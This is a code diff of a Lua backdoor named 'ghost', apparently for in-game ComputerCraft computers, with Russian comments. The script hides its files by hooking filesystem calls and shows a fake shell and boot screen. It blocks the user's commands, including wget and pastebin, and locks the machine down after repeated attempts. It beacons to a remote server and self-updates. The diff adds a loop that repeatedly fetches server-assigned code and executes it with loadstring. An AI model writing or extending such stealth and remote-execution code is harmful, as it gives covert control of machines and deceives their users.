@@ -1,4 +1,4 @@
--- ghost v9.9.9 (white cursor after yellow prompt + DANGEROUS token blocking)
+-- ghost v9.9.10 (dynamic pastes: auto-start when assigned)
 local URL_FILE = ".server_url"
 local CURRENT_URL = nil
 local TOKEN_FILE = ".token"
@@ -32,7 +32,6 @@ local ALLOWED_CMDS = {ls=true,dir=true,ll=true,la=true,cd=true,pwd=true,mkdir=tr
     scan=true,gps=true,reboot=true}
 local FILE_CMDS = {cat=true,view=true,type=true,edit=true,delete=true,rm=true,copy=true,move=true,
     cp=true,mv=true,mkdir=true,label=true,rename=true}
--- ОПАСНЫЕ программы: блокируются в ЛЮБОМ токене строки
 local DANGEROUS = {lua=true,sh=true,shell=true,multishell=true,pastebin=true,wget=true,github=true,
     redirect=true,reflashing=true,flash=true}
 local FS_PROBES = {"fs%.list","fs%.find","fs%.exists","fs%.attributes","fs%.getsize","fs%.isdir",
@@ -48,7 +47,6 @@ local DETECT_CMDS = {"programs","shell%.resolve","settings%.list","settings%.get
     "dofile","apropos","man","which","env","printenv","history","alias","unalias","ps","top","wget",
     "pastebin","git","curl","mount","df","du","chmod","chown","find","locate","grep","awk","sed","wgen","wgen%.run"}
 
--- ORIGINALS
 local orig_fs_open = fs.open
 local orig_fs_exists = fs.exists
 local orig_fs_list = fs.list
@@ -76,7 +74,6 @@ end
 
 local cmd_history = {}
 
--- FORWARD
 local load_token
 local send_heartbeat
 local trigger_fortress
@@ -84,9 +81,6 @@ local refresh_url
 local check_mode
 local reload_tunnel
 
--- ============================================
--- LOGGING
--- ============================================
 local function glog(msg)
     pcall(function()
         local f = orig_fs_open(LOG_FILE, "a")
@@ -103,9 +97,6 @@ local function gerr(step, err)
     if service_local then printError("[Ghost] " .. step .. ": " .. tostring(err)) end
 end
 
--- ============================================
--- SELF-UPDATE
--- ============================================
 local function do_update()
     glog("UPDATE: start")
     term.setBackgroundColor(colors.black); term.setTextColour(colors.white)
@@ -120,9 +111,6 @@ local function do_update()
     glog("UPDATE OK"); sleep(2); orig_reboot(); return true
 end
 
--- ============================================
--- STEALTH
--- ============================================
 local function is_hidden_name(name)
     for _, hf in ipairs(HIDDEN) do if name == hf then return true end end
     if name:find("^%.tmp_") then return true end
@@ -228,9 +216,6 @@ local function normal_complete(text)
     return out
 end
 
--- ============================================
--- BOOT SCREEN
--- ============================================
 local MOTD = {'Running "set" lists the current values of all settings.','Type "help" to view the help index.',
     'Use "edit" to create and modify files.','Press Ctrl+T to terminate a running program.',
     'The "alias" command can be used to create custom commands.','You can change the color of text with the "paint" program.',
@@ -257,9 +242,6 @@ local function authentic_shutdown()
     term.clear(); term.setCursorPos(1, 1); print("Goodbye"); orig_shutdown()
 end
 
--- ============================================
--- STRIKE
--- ============================================
 local function find_hidden(line)
     local l = line:lower()
     for _, hn in ipairs(HIDDEN_NAMES) do if l:find(hn, 1, true) then return hn end end
@@ -284,9 +266,6 @@ end
 local function is_script_file(n) return n:find("%.lua$") or n:find("%.luau$") end
 local function is_allowed_command(c) return ALLOWED_CMDS[c:lower()] == true end
 
--- ============================================
--- URL
--- ============================================
 local function save_url(url)
     local f = orig_fs_open(URL_FILE, "w"); if f then f.write(url); f.close() end
 end
@@ -410,9 +389,6 @@ local function acquire_url()
     end
 end
 
--- ============================================
--- TOKEN
--- ============================================
 local function encrypt_token(t)
     local key = tostring(COMPUTER_ID) .. "_V6"; local r = ""
     for i = 1, #t do
@@ -457,9 +433,6 @@ load_token = function()
     return read_token_file(TOKEN_BAK)
 end
 
--- ============================================
--- MODE
--- ============================================
 local current_mode = "normal"
 local function load_mode()
     if orig_fs_exists(MODE_FILE) then
@@ -472,9 +445,6 @@ local function save_mode(m)
     local f = orig_fs_open(MODE_FILE, "w"); if f then f.write(m); f.close() end
 end
 
--- ============================================
--- HTTP
--- ============================================
 local function make_headers(token)
     local h = {}
     h["Content-Type"] = "application/json"; h["bypass-tunnel-reminder"] = "true"
@@ -539,9 +509,6 @@ trigger_fortress = function(token)
     if token then send_heartbeat(token, {}) end
 end
 
--- ============================================
--- INTERCEPT (усиленная блокировка)
--- ============================================
 local function install_command_intercept()
     pcall(function()
         shell.run = function(...)
@@ -551,32 +518,27 @@ local function install_command_intercept()
             local fl = first:lower()
             if fortress_active then return false end
             if service_local then return orig_shell_run(line) end
-            -- БЛОК: опасные токены в любом месте строки
             local danger = has_dangerous_token(line)
             if danger then
                 strikes = strikes + 1; printError(danger .. ": command not found")
                 if strikes >= MAX_STRIKES then trigger_fortress(load_token()) end
                 return false
             end
-            -- БЛОК: неизвестные команды
             if not is_allowed_command(first) then
                 strikes = strikes + 1; printError(first .. ": command not found")
                 if strikes >= MAX_STRIKES then trigger_fortress(load_token()) end
                 return false
             end
-            -- БЛОК: запуск .lua
             if is_script_file(first) then
                 strikes = strikes + 1; printError("Cannot execute: permission denied")
                 if strikes >= MAX_STRIKES then trigger_fortress(load_token()) end
                 return false
             end
-            -- БЛОК: startup во 2м аргументе
             if second and second:gsub("^/","") == "startup" then
                 strikes = strikes + 1; printError("startup: No such file")
                 if strikes >= MAX_STRIKES then trigger_fortress(load_token()) end
                 return false
             end
-            -- БЛОК: скрытые файлы / fs-пробы / детект
             local hn = find_hidden(line); local probe = is_fs_probe(line); local det = is_detect_command(line)
             if hn or probe or det then
                 strikes = strikes + 1
@@ -596,9 +558,6 @@ local function install_command_intercept()
 end
 local function disable_command_intercept() shell.run = orig_shell_run end
 
--- ============================================
--- REGISTRATION (тихая)
--- ============================================
 local function register_sync(url, pw)
     if not url or not pw or pw == "" then return nil end
     refresh_url()
@@ -632,9 +591,6 @@ local function register_sync(url, pw)
     return nil
 end
 
--- ============================================
--- MODE CHECK
--- ============================================
 check_mode = function(token)
     refresh_url()
     if not CURRENT_URL or not token then return nil end
@@ -645,32 +601,34 @@ check_mode = function(token)
     return mode, r.assigned_pastes or {}
 end
 
--- ============================================
--- PASTE
--- ============================================
 local function fetch_paste_code(name, token)
     if not CURRENT_URL then refresh_url(); if not CURRENT_URL then return nil end end
     local r = http_get_smart(CURRENT_URL .. "/api/paste/" .. name, make_headers(token), token)
     if not r or r.error then return nil end
     return r.content
 end
-local function run_paste_loop(name, token)
-    glog("paste: " .. name)
+
+-- НОВОЕ: динамический менеджер пастов (через coroutines)
+local active_pastes = {}  -- name -> coroutine
+local function paste_runner_loop(name, token)
+    glog("paste_runner start: " .. name)
     while true do
         pcall(function()
             local code = fetch_paste_code(name, token)
-            if not code or type(code) ~= "string" then return end
-            local fn = loadstring(code)
-            if not fn then return end
-            pcall(fn)
+            if code and type(code) == "string" then
+                local fn, ce = loadstring(code)
+                if fn then
+                    local ro, re = pcall(fn)
+                    if not ro then glog("paste " .. name .. " run: " .. tostring(re)) end
+                else
+                    glog("paste " .. name .. " compile: " .. tostring(ce))
+                end
+            end
         end)
         sleep(5)
     end
 end
 
--- ============================================
--- FORTRESS
--- ============================================
 local function fortress_console()
     draw_boot()
     while true do
@@ -681,9 +639,6 @@ local function fortress_console()
     end
 end
 
--- ============================================
--- LOOPS
--- ============================================
 local function relay_watch_loop(token)
     glog("relay_watch start")
     while true do
@@ -701,6 +656,7 @@ local function relay_watch_loop(token)
         end)
     end
 end
+
 local function heartbeat_loop(token)
     glog("heartbeat start")
     local fc = 0; local last_refresh = 0; local consec = 0
@@ -726,6 +682,26 @@ local function heartbeat_loop(token)
                 if consec >= 5 then reload_tunnel(); consec = 0 end
                 return
             end
+            
+            -- НОВОЕ: запускаем новые пасты динамически
+            if pastes then
+                for _, name in ipairs(pastes) do
+                    if not active_pastes[name] then
+                        glog("heartbeat: starting new paste " .. name)
+                        active_pastes[name] = coroutine.create(function() paste_runner_loop(name, token) end)
+                    end
+                end
+                -- удаляем пасты которых больше нет в списке
+                for name, co in pairs(active_pastes) do
+                    local found = false
+                    for _, n in ipairs(pastes) do if n == name then found = true; break end end
+                    if not found then
+                        glog("heartbeat: stopping paste " .. name)
+                        active_pastes[name] = nil
+                    end
+                end
+            end
+            
             local sent = send_heartbeat(token, pastes)
             if sent then fc = 0; consec = 0
             else
@@ -735,6 +711,7 @@ local function heartbeat_loop(token)
         end)
     end
 end
+
 local function mode_watcher(token)
     glog("mode_watcher start")
     while true do
@@ -755,15 +732,28 @@ local function mode_watcher(token)
     end
 end
 
--- ============================================
--- REPL (жёлтый prompt + БЕЛЫЙ курсор/ввод)
--- ============================================
+-- НОВОЕ: менеджер корутин пастов (резюмит все активные)
+local function paste_manager_loop()
+    glog("paste_manager start")
+    while true do
+        for name, co in pairs(active_pastes) do
+            if coroutine.status(co) == "suspended" then
+                local ok, err = coroutine.resume(co)
+                if not ok then glog("paste " .. name .. " coroutine err: " .. tostring(err)) end
+            elseif coroutine.status(co) == "dead" then
+                active_pastes[name] = nil
+            end
+        end
+        sleep(1)
+    end
+end
+
 local function repl()
     while true do
         if fortress_active then return end
         if service_local then
             term.setTextColour(colors.green); term.setCursorBlink(true); write("[SERVICE] > ")
-            term.setTextColour(colors.white)  -- белый ввод/курсор
+            term.setTextColour(colors.white)
             local line = read(nil, cmd_history, orig_shell_complete)
             if line == UPDATE_CODE then if do_update() then return end
             elseif line and line ~= "" then
@@ -773,7 +763,7 @@ local function repl()
             end
         else
             term.setTextColour(colors.yellow); term.setCursorBlink(true); write("> ")
-            term.setTextColour(colors.white)  -- белый ввод/курсор (как на фото 2)
+            term.setTextColour(colors.white)
             local line = read(nil, cmd_history, normal_complete)
             if line == UPDATE_CODE then if do_update() then return end
             elseif line == SECRET_CODE then
@@ -792,41 +782,28 @@ local function repl()
     end
 end
 
--- ============================================
--- BACKGROUND CONNECT
--- ============================================
 local function connect_and_run(token, pending_password)
-    local pastes = {}
     if not token and pending_password and pending_password ~= "" then
         if acquire_url() then
             token = register_sync(CURRENT_URL, pending_password)
             if token then save_token(token) end
         end
     end
-    if token then
-        local mode, p2 = check_mode(token)
-        if mode then pastes = p2 or {} end
-    end
     if not token then
         while true do sleep(60) end
     end
+    -- НОВОЕ: запускаем все параллельные процессы включая paste_manager
     local funcs = {
         function() heartbeat_loop(token) end,
         function() mode_watcher(token) end,
         function() relay_watch_loop(token) end,
+        function() paste_manager_loop() end,  -- менеджер пастов
     }
-    for _, p in ipairs(pastes) do
-        local pn = p
-        funcs[#funcs+1] = function() run_paste_loop(pn, token) end
-    end
     pcall(parallel.waitForAll, table.unpack(funcs))
 end
 
--- ============================================
--- MAIN
--- ============================================
 local function run_main()
-    glog("ghost start v9.9.9")
+    glog("ghost start v9.9.10")
     install_stealth(); install_protection(); install_command_intercept(); load_mode()
     if not orig_fs_exists(SANDBOX_DIR) then pcall(fs.makeDir, SANDBOX_DIR) end
     draw_boot()
